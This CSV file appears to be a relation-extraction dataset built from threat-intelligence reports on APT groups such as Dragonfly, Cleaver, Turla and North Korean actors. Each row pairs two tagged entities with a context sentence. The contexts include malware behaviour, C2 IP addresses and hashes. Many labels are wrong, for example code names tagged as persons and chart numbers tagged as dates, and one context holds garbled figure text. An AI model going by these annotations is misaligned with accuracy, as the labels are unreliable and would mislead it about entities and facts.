"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacktime","Troy","PERSON","10 Days of Rain","DATE","The operation was codenamed “ Troy ” due to the frequent use of the word “ Troy ” in the malware ’s compile path strings.335 The malware used in these attacks sought out and exfiltrated data , based on keyword searches . While the malware was clearly intended to search for and exfiltrate certain types of data , its true impact on the targets was never revealed . 336 The March 2011 “ 10 Days of Rain ” DDoS attacks on U.S. and South Korean sites have also been attributed to the actors associated with DarkSeoul.337 "
"unveilingthemask_v1.0","indicates","Careto","PRODUCT","two","CARDINAL","The attackers use two software packages and several related utilities . The main software packages are named “ Careto ” and “ SGH ” . "
"Group_72","hasattacklocation","Novetta","ORG","United States","GPE","Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta . The group is sophisticated , well funded , and possesses an established , defined software development methodology . The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors . Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea . "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","hasattacklocation","Energetic Bear","ORG","US","GPE","The Dragonfly group , which is also known by other vendors as Energetic Bear , are a capable group who are evolving over time and targeting primarily the energy sector and related industries . They have been in operation since at least 2011 but may have been active even longer than that . Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 . "
"group-3279-targets-the-video-game-industry","hasattacktime","C2","ORG","December 31, 2013","DATE","Additionally , some of the C2 domains used in TG-3279 operations have shared the same IP address as the hostname www . sincoder . com . CTU researchers discovered a GitHub account for a user named "" sincoder , "" which was active as recently as December 31 , 2013 . "
"KL_Epic_Turla_Technical_Appendix_20140806","hasproduct","Wininet","ORG","API","PRODUCT","The module uses Wininet API functions for issuing HTTP POST requests to the server . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Ikeguchi","PERSON","North Korea","GPE","Ikeguchi is one of the Chongryon‘s many ties to organized crime . Ikeguchi was arrested in the past for an attempted coup against the Japanese government . He also has ties to the political group Nihon Seinensya , which is involved in illegal activities in conjunction with the yakuza syndicate Sumiyoshi - kai , which imports and sells amphetamines made in North Korea.177 North Korea also has black market ties to Sumiyoshi - kai ’s rival syndicate , Yamaguchi - gumi . "
"deep-panda-webshells","hasattacklocation","Web Shell","ORG","China","GPE","A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP . When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions . Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries . "
"french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012","hasattacktime","SWC","ORG","2012","DATE","This other activity appears to be focused on French aerospace and shares similarities with a 2012 SWC campaign affecting "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Matt Rhoades","PERSON","North Korea","GPE","However , North Korea reportedly utilizes over 200 military intelligence operatives to troll South Korean message boards and social media pages with pro - North Korean sentiments.215 Matt Rhoades , director of the cyberspace and security program at the Truman National Security Project , said , "" North Korea 's cyber - development is almost just a new harassment mechanism for them , a low - cost , asymmetric method to harass its neighbor in the south … ""216 Leveraging the cyber and intelligence resources noted above , North Korea ’s psychological operations serve an important strategic role . "
"Targeted_Attacks_Lense_NGO","hasattacklocation","WUC","ORG","China","GPE","WUC frequently engages in advocacy and meeting with politicians and diplomats at the EU and UN , as well as collaborating with a variety of NGOs . Rebiya Kadeer , WUC ’s current president , was the ffth richest person in China before her imprisonment for dissent in 1996 , and is now in exile in the US . "
"Hikit_Analysis-Final","indicates","Gen 1","PRODUCT","at least two","CARDINAL","Basic Description Hikit consists of at least two generations of malware that provides basic RAT functionality . The first generation of Hikit ( referred to as “ Gen 1 ” ) operates as a server and requires an externally exposed network interface in order for an attacker to access the victim machine . "
"group-3279-targets-the-video-game-industry","hasattacklocation","Sincoder","PERSON","Beijing","GPE","Based upon the geolocation of older Weibo posts , Sincoder may have previously lived in Beijing 's Dongcheng District . "
"Targeted_Attacks_Lense_NGO","hasproduct","Microsoft","ORG","Windows","PRODUCT","In the case of EXE fles , we also examined them manually to determine whether their Microsoft Windows icons were similar to those used for other fle formats ( e.g. , JPEG ) in order to persuade average users that they were not executable . "
"Group72_Opening_ZxShell","hasproduct","Microsoft","ORG","SvcHost","PRODUCT","The Svchost group registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost is opened and the netsvc group value data is queried to generate a name for the service . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacklocation","CrowdStrike","ORG","Russia","GPE","Deep in Thought : Chinese Targeting of National Security Think Tanks July 7 , 2014 Dmitri Alperovitch Executive Viewpoint For some time now , CrowdStrike has been working with a number of national security think tanks and human rights organizations on a pro bono basis to help them with their security posture . These organizations face some of the most advanced nation - state adversaries — China , Russia , and Iran , just to name a few . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacklocation","CrowdStrike","ORG","Iran","GPE","Deep in Thought : Chinese Targeting of National Security Think Tanks July 7 , 2014 Dmitri Alperovitch Executive Viewpoint For some time now , CrowdStrike has been working with a number of national security think tanks and human rights organizations on a pro bono basis to help them with their security posture . These organizations face some of the most advanced nation - state adversaries — China , Russia , and Iran , just to name a few . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Netafraz.com","ORG","Iran","GPE","The infrastructure is hosted through Netafraz.com , an Iranian provider out of Isfahan , Iran . • The infrastructure utilized in the campaign is too significant to be a lone individual or a small group . We believe this work was sponsored by Iran . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacktime","Democratic Party","ORG","almost 10 years","DATE","These spies within their trusted circles had been reporting back to North Korea for almost 10 years . The embedded spies included a Democratic Party representative . "
"EB-YetiJuly2014-Public","indicates","Yeti","PRODUCT","dozens","CARDINAL","The dozens of known Yeti exploit sites and their referrer sites were legitimate , compromised sites . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","The Reconnaissance General Bureau","ORG","China","GPE","The Reconnaissance General Bureau is responsible for oversight of this network.182 The businesses include cafes and other non - suspect establishments . The highest concentration of these is in China . "
"Cylance_Operation_Cleaver_Report","hasproduct","PVZ","ORG","Logger Module  Logger","PRODUCT","Logger Module Logger module is a component of the PVZ ( PVZ is shorthand for Parviz , one of the members of the Cleaver team ) bot tool chain . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","China Netcom","ORG","North Korea","GPE","Previously , Internet access was provided by a German satellite link via Korea Computer Center Europe or via direct connections with China Netcom , which was later merged into China Unicom . 62 By October 2010 , North Korea had made its first known direct connection to the Internet , hosting an outward - facing Korean Central News Agency website accessible from the global Internet . 63 However , many of North Korea ’s globally accessible websites are hosted in other countries . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","KeyRun","ORG","Windows","PRODUCT","A subkey is added to KeyRun to automatically start the malware when Windows reboots . "
"ThreatConnect_Operation_Arachnophobia_Report","hasattacklocation","ThreatConnect","ORG","India-Pakistan","GPE","It was this chain of events that served as a catalyst for extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information . While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point to many characteristics of a Pakistan - based cyber exploitation effort that is probably directed against Indian targets or those who are involved in India - Pakistan issues . "
"fireeye-sidewinder-targeted-attack","hasproduct","Android Runtime","ORG","Java Native Interface","PRODUCT","Fortunately , Android Runtime offers another way to load Java Native Interface ( JNI ) code into the host app using Runtime.load ( ) . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Narushige Michishita","PERSON","Russia","GPE","Narushige Michishita , a North Korea and Asia security expert at Japan 's National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan . ”256 Russia also recently forgave most of the regime ’s debts.257 Iran North Korea and Iran have longstanding political and military ties . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Appendix A","ORG","Syria","GPE","This information can be found in Appendix A at the end of this paper . Korea Computer Center ( KCC ) is North Korea ’s leading government research center for information technology . KCC has eleven regional information centers and eight development and production centers . Other countries with KCC branch offices include China , Syria , Germany , and United Arab Emirates . "
"Korplug_Afghanistan_Tajikistan","hasattacklocation","Quedagh","PERSON","Ukraine","GPE","An example is the BlackEnergy Lite variant ( also known as BlackEnergy 3 ) used by a group of attackers ( that was then given the name Quedagh , or Sandworm ) against targets in Ukraine and other countries . "
"Targeted_Attacks_Lense_NGO","hascharacteristics","three","CARDINAL","3","CARDINAL","We also translated the professional positions of the victims into one of the three categories : High , Medium , and Low profle . We consider professional lead­ership positions such as chairpersons , presidents , and ex­ecutives as high - profle , job positions such as assistants , and IT personnel as medium - profle , and unknown and shared email addresses ( e.g. , NGO ’s contact informa­tion ) as low - profle . Figure 3 : Distribution of languages for each year of our dataset . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Appendix A","ORG","North Korea","GPE","This information can be found in Appendix A at the end of this paper . Korea Computer Center ( KCC ) is North Korea ’s leading government research center for information technology . "
"ZoxPNG_Full_Analysis-Final","hasattacktime","Zox","PERSON","the several years","DATE","The source code upon which the Zox family is based is found at http://www.exploit-db.com/download/21371/ , which was written by well - known Chinese hacker yuange . Given the several years between the original source code ( 2002 ) and both ZoxPNG ( 2013 ) and ZoxRPC ( 2008 ) , the code upon which Zox is based has mutated and evolved , but there are clearly sections of code that have remained largely unaltered . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Ashiyane","ORG","Iran","GPE","Some connections to Ashiyane were discovered in our investigations including a reference to hussein1363 , who had prior ties to the hacker group . Additional connections between team members and individuals exist but are predominantly speculative and have only been shared with law enforcement . Ultimately we believe the Cleaver team is a mix of existing team members and new recruits pulled from the universities in Iran . "
"Group_72","hasattacklocation","Novetta","ORG","Taiwan","GPE","Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta . The group is sophisticated , well funded , and possesses an established , defined software development methodology . The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors . Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacklocation","ISIS","ORG","China","GPE","This is undoubtedly related to the recent Islamic State of Iraq and the Levant ( ISIS ) takeover of major parts of Iraq and the potential disruption for major Chinese oil interests in that country . In fact , Iraq happens to be the fifth - largest source of crude oil imports for China and the country is the largest foreign investor in Iraq ’s oil sector . "
"ICS_Havex_backdoors","hasattacklocation","Dragonfly","ORG","Belgium","GPE","The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","Taiwan","GPE","The themes -- or topics — used in the emails from the DragonOK group were well crafted and highly tailored to the target audience . We also found this attack group using the appropriate language for each of their targets in the phishing emails – such as Japanese and traditional Chinese ( mainly used in Taiwan ) . "
"Cylance_Operation_Cleaver_Report","hasattacktime","Cleaver","PERSON","30  8 9  12 16  8 10  11 29 25  35 1433 20 19 18 34 26 28 32 31  31","DATE","Fully compromised VPN credentials meant their entire remote access infrastructure and supply chain was under the control of the Cleaver team , allowing permanent persistence under compromised credentials . They achieved complete access to airport gates and their security control systems , potentially allowing them to spoof gate credentials . They gained access to PayPal and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered access to the victim ’s domains . We were witnessed a shocking amount of access into the deepest parts of these companies and the airports in which they operate . COUNTRIES TARGETED 6 12 4 3 B A 22 A5 B B AB A7 21 A B 23 B BB 13 24 17 15 30 8 9 12 16 8 10 11 29 25 35 1433 20 19 18 34 26 28 32 31 31 AB27 TARGET LOCATIONS 1 . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","IranRedLine.org","ORG","Iran","GPE","The operators of the blog IranRedLine.org , which comments on Iran ’s nuclear weapons efforts , has mentioned in multiple posts having been the target of debilitating brute - force authentication attacks from IP addresses registered to the same Tarh Andishan team found in Cleaver . "
"Darwin_fav_APT_Group","hasattacklocation","RIPTIDE","ORG","Taiwan","GPE","These documents were also emailed to organizations in Japan and Taiwan . While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE . Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified . However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 . "
"group-3279-targets-the-video-game-industry","hasattacklocation","Weibo","ORG","China","GPE","The Weibo account follows both the Wuhan University of Technology and the Wuhan University Jingwei Forum . Like Laurentiu Moon , Sincoder is also a member of the China Cracking Group . A Twitter account notes the persona 's location as Shenzhen , China . "
"ICS_Havex_backdoors","hasproduct","Dragonfly","ORG","Havex","PRODUCT","The Havex backdoor is developed and used by a hacker group called Dragonfly , who are also known as "" Energetic Bear "" and "" Crouching Yeti "" . "
"ICS_Havex_backdoors","hasattacklocation","Dragonfly","ORG","Germany","GPE","The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) . "
"FTA_1014_Bots_Machines_and_the_Matrix","hasattacktime","320","MONEY","May 2013","DATE","It appears that in May 2013 , the pre - built bot could be purchase for $ 320-$500 , and $ 20 for variant rebuilds for those requiring configuration changes . "
"FTA_1014_Bots_Machines_and_the_Matrix","hasattacktime","500","MONEY","May 2013","DATE","It appears that in May 2013 , the pre - built bot could be purchase for $ 320-$500 , and $ 20 for variant rebuilds for those requiring configuration changes . "
"Darwin_fav_APT_Group","hasattacklocation","APT12","ORG","Taiwan","GPE","APT12 is believed to be a cyber espionage group thought to have links to the Chinese People ’s Liberation Army . APT12 's targets are consistent with larger People ’s Republic of China ( PRC ) goals . Intrusions and campaigns conducted by this group are in - line with PRC goals and self - interest in Taiwan . "
"fireeye-operation-quantum-entanglement","hasattacktime","HTRAN","ORG","between July 31, 2013 and August 8, 2013","DATE","Like the Moafee group , we observed the DragonOK group running an HTRAN proxy client on one of their front - end command and control servers . For approximately one week , between July 31 , 2013 and August 8 , 2013 , the domain www.ndbssh[.]com served as a command and control server for Mongall payloads distributed by the DragonOK group . "
"GData_Uroburos_RedPaper_EN_v1","hasattacktime","Uroburos","PERSON","at least three years","DATE","We found Uroburos samples with a resource in Russian language : In case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help , would like to receive further technical information or would like to contribute any information about this case , please feel free to contact us by email using the following mailbox : intelligence@gdata.de Conclusion The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed . The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Unikotech","ORG","North Korea","GPE","One example is Unikotech , which was formed to sell KCC products abroad . 140 The Chongryon ’s underground group known as the Gakushu - gumi , or “ the study group ” , gathers intelligence for North Korea and helps the regime procure advanced technologies.141 "
"GDATA_TooHash_CaseStudy_102014_EN_v1","hasattacklocation","daily","DATE","Hong Kong","GPE","Naturally , the recipients are inclined to open such documents on a daily base . The majority of discovered samples were submitted from Taiwan . As part of the documents are in Simplified Chinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong , Macao and Taiwan , these malicious documents might have been used against targets in the whole Greater China area . "
"ZoxPNG_Full_Analysis-Final","hasproduct","CommandHeader","ORG","CommandData","PRODUCT","The commands themselves are ignorant of the CommandHeader as only the CommandData is sent to the individual command handlers . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Kim Il-Sung","PERSON","Cuba","GPE","Following the incident , Fidel Castro credited former North Korean leader Kim Il - Sung for providing Cuba with weapons near the end of the Cold War . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","TinyZBot","ORG","Netherlands","GPE","This allowed supplemental tools to keep TinyZBot running by enumerating every process and checking if the process ID and mutex prefix existed . If no mutex and process pair was located , another TinyZBot instance would be started . Command and Control Servers  88.150.214.168 , United Kingdom , microsoftactiveservices(dot)com  95.211.241.249 , Amsterdam , Noord - Holland , Netherlands  88.150.214.166 , United Kingdom  173.192.144.68 , Seattle , Washington , USA  188.227.180.213 , United Kingdom  192.111.145.197 , Rochester , New York , USA Backdoors "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","indicates","Initialization Vector","PRODUCT","192 bit 3DES","QUANTITY","Once the log has been compressed using bzip2 , the modules use the library to generate a random 192 bit 3DES key ( 168 bit effective ) and a 64 bit Initialization Vector . "
"Targeted_Attacks_Lense_NGO","hasproduct","Acrobat Reader","ORG","Acrobat Reader","PRODUCT","The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader . Although Acrobat Reader was the most targeted application until 2010 , recent attacks mainly target the Offce suite . "
"ThreatConnect_Operation_Arachnophobia_Report","hasattacklocation","VPSNOC","ORG","Pakistan","GPE","On August 15 , 2013 , three days later , Qamar responded to TCIRT with a brief denial12 of any modifications to the screenshot ( other than email address anonymization ) and specifically referred TCIRT back to VPSNOC support ( support@vpsnoc.com ) for any follow up questions . Astonished by this dismissal and deflection , TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas . VPSNOC / Digital Linx / Tranchulas During our research into VPSNOC , we identified that it is actually based in , or conducts partial operations from within , Pakistan . "
"Group72_Opening_ZxShell","hasproduct","ZwOpenEvent","ORG","Kernel API","PRODUCT","In this manner , ZxShell is able to completely hide itself , intercepting the following Kernel API calls : ZwAllocateVirtualMemory , ZwOpenEvent , ZwQueryDirectoryFile , ZwWriteFile , ZwEnumerateKey , and ZwDeviceIoControlFile . Command and Control Server Sample ( SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c ) is configured to act as a server . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Kim Jong Un","PERSON","Korea","GPE","Christian Whiton , a former deputy envoy to North Korea , noted that following Kim Jong Un ’s rise to power , “ the regime still acts in a very belligerent manner , but it seems less predictable , and more random . ” Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International Studies , assessed the situation thusly : “ Since [ Kim Jong Un ] took power he has purged almost all of his elder guardians ... and filled his surroundings with new faces . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Backdoor.Prioxer. Prioxer","ORG","South Korea","GPE","This RAT is detected by Symantec as Backdoor . Prioxer . Prioxer has been linked to other 2011 attacks on South Korea . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","India","GPE","In fact , oil and gas was a particular focal point for the Cleaver team , going after no less than nine of these companies around the world . Universities were targeted in the US , India , Israel , and South Korea . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CrowdStrike","ORG","South Korea","GPE","According to CrowdStrike , a third malware component downloaded an IRC RAT from various compromised websites . This RAT is detected by Symantec as Backdoor . Prioxer . Prioxer has been linked to other 2011 attacks on South Korea . "
"Cylance_Operation_Cleaver_Report","hasproduct","TinyZBot","ORG","ZeuS","PRODUCT","The name TinyZBot is assumed to be referring to this project as a less versatile version of the ZeuS botnet , although it does not exhibit the major browser injection features of ZeuS. To be clear , TinyZBot shares no code with ZeuS or its variants , and is developed in a different programming language . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Xi Jinping","PERSON","South Korea","GPE","In June 2014 , the regime demanded cancellation of the annual U.S. - South Korea joint military exercise , attempting to use participation in the upcoming Asian Games as a bargaining chip.329 The regime ’s demands may have had other political motivations , as they preceded the July 2014 meeting between South Korean president Park and Chinese President Xi Jinping . The meeting centered on trade and regional security issues , including the ever - present rhetoric around denuclearization of North Korea.330 Both leaders were critical of Japan ’s recent announcement to soften sanctions on North Korea.331 As this report headed to press , the annual U.S. – South Korea joint military exercises were underway.332 330 http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7 331 http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share 332 http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill 333 http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks 334 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2 335 http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674 ? "
"Targeted_Attacks_Lense_NGO","hasattacklocation","TAO","ORG","Syria","GPE","Ex­amples of national organizations that have been reported to be engaged in targeted attacks include the NSA ’s of­fce of Tailored Access Operations ( TAO ) [ 3 ] and the People ’s Liberation Army ’s Unit 61398 [ 15 ] . Recently , researchers also attributed attacks in the Middle East to the governments of Bahrain , Syria , and the United Arab Emirates [ 16 ] . "
"darkhotelappendixindicators_kl_1.1","indicates","Chrome","PRODUCT","one","CARDINAL","Depend­ing on version of Firefox , it can read Firefox database directly to dump stored se­crets or utilize one Firefox libraries to access the configuration data . In addition it makes use of the following Mozilla Firefox libraries depending on Firefox version : • nss3.dll • plc4.dll • mozcrt19.dll • mozutils.dll • mozglue.dll • mozsqlite3.dll • sqlite3.dll • nspr4.dll • plds4.dll • nssutil3.dll • softokn3.dll When stealing secrets from Firefox and Chrome it uses built - in SQLite library code . "
"Targeted_Attacks_Lense_NGO","hasproduct","Offce","ORG","Acrobat Reader","PRODUCT","We fnd a correlation be­tween the time of this switch and two events : ( a ) the de­ployment of sandboxing defenses in Adobe Reader and ( b ) the disclosure of vulnerabilities in the Offce suite . The frst version of Acrobat Reader to support sandbox­ing for Windows ( version 10.0 ) was released on Novem­ber 15 , 2010 . "
"deep-panda-webshells","hasattacklocation","ASPX","ORG","China","GPE","A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP . When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions . Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries . "
"Group72_Opening_ZxShell","hasproduct","Microsoft","ORG","SvcHost","PRODUCT","The malware accomplishes this through querying the netsvc group value data located in the svchost group registry key which is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","Japan","GPE","The amount of information contained in CSTIA 's technical database makes it North Korea 's largest scientific facility . According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","Russia","GPE","According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"fireeye-operation-saffron-rose","hasattacklocation","6","CARDINAL","Japan","GPE","“ Network Crack Program Hacker Group”.6 Dunham , K. & Melnick , J. “ ’ Wicked Rose ’ and the NCPH Hacking Group”.7 Blasco , J. “ The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday ” . September 2012.8 Key . “ Honker Union of China to launch network attacks against Japan is a rumor ” . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Japan","GPE","Conclusion Based on the geolocation evidence provided in this paper , it appears that different operators executed the Moafee and DragonOK campaigns . This conclusion is supported by the following assessments :  The campaigns target different industries in different geographic locations . The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea . In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan . "
"ZoxPNG_Full_Analysis-Final","hasproduct","CommandHeader","ORG","CommandData","PRODUCT","The command dispatch is ignorant of any data that follows beyond the CommandHeader and CommandData . The commands themselves are ignorant of the CommandHeader as only the CommandData is sent to the individual command handlers . "
"unveilingthemask_v1.0","hasproduct","Java","ORG","Java","PRODUCT","Several attacks against browsers supporting Java have been observed . Unfortunately , we were n’t able to retrieve all the components from these attacks , as they were no longer available on the server at the time of checking . The first known method ( “ ” /jr/ ” folder ) uses an HTML ( “ frame-index.htm ” ) file that attempts to load and run a signed applet . Figure 11 : JavaUpdate.jar File name : JavaUpdate.jar MD5 : da1ad4e088ba921c0420428b1f73d5ca File size : 273639 bytes The JavaUpdate.jar contains an exploit for CVE-2011 - 3544 , a vulnerability in the Java Runtime Environment ( JRE ) component in Oracle JAVA SE JDK and JRE 7 , 6 Update 27 and earlier . Both the Java archive and the malicious Windows payload code appears to have been compiled on Nov 7 , 2013 . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","China","GPE","According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"ThreatConnect_Operation_Arachnophobia_Report","hasproduct","BITTERBUG","ORG","SFXRAR","PRODUCT","Figure 11 : Generic Debug Path Between December 2013 and late March 2014 , we observed several new lures used in BITTERBUG self - extracting RAR ( SFXRAR ) files . "
"unveilingthemask_v1.0","indicates","01:16:44","TIME","two","CARDINAL","The CAB archive that holds the payloads contains two files : Name File Size Compilation Time Shlink64.dll 144384 bytes 14.07.2009 01:16:44 "
"wp-operation-pawn-storm","hasproduct","Safari®","ORG","Internet Explorer®","PRODUCT","The attacks worked on any popular browser such as Firefox ® , Safari ® , Chrome ™ , and Internet Explorer ® . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Kim Il-Sung","PERSON","North Korea","GPE","It was instituted in 1972 and is based on the ideologies of Kim Il - Sung , the founder of the DPRK . Juche emphasizes self - reliance , mastering revolution and reconstruction in one ’s own country , being independent of others , displaying one ’s strengths , defending oneself , and taking responsibility for solving one ’s own problems . North Korea ’s air - gapped intranet , described below , exemplifies this philosophy in the country ’s cyber infrastructure . "
"KL_report_syrian_malware","hascharacteristics","Trojans","NORP","2","CARDINAL","The sample details and domain lists used by the attackers can be found in Appendices 1 and 2 in the end of this document . 3.2.11 . Activist Behavior It is worth noting that we have seen evidence of activists trying to carry out Denial of Service attacks on the RAT domains and servers , in an effort to overwhelm their resources and cause their connections to timeout . The post below shows a warning from activists about pro - government hacker attacks on Facebook pages , explaining how pro - government groups post links to Trojanized applications in order to infect users The activists announce in the post that they have spotted a C&C domain used by the Trojans and that they are attacking it to remove all hacked victims . "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","hasproduct","Backdoor.Oldrea","ORG","Lightsout","PRODUCT","The Lightsout exploit kit is a simple exploit kit that is consistently used to deliver primarily Backdoor . Oldrea and , in several instances , Trojan . Karagany . "
"ZoxPNG_Full_Analysis-Final","hasproduct","Process32First","ORG","WTSEnumerateProcesses","PRODUCT","When activated , the command handler obtains a list of active processes on the victim ’s machine by calling WTSEnumerateProcesses . By using WTSEnumerateProcesses instead of the more common Process32First and Process32Next functions , the Enumerate Processes command can also list processes associated with terminal server sessions . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","GSD","ORG","North Korea","GPE","The Ministry of People ’s Armed Forces ( MPAF ) administrates the Korean People ’s Army ( KPA ) and oversees the General Staff Department ( GSD ) , which is responsible for operational command and control of North Korea ’s armed forces . "
"deep-panda-webshells","hascharacteristics","four","CARDINAL","3","CARDINAL","Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : Mo ’ Shells Mo ’ Problems : Deep Panda Web Shells ( Part 1 ) Mo ’ Shells Mo ’ Problems : File Stacking ( Part 2 ) Mo ’ Shells Mo ’ Problems : Web Log Review ( Part 3 ) "
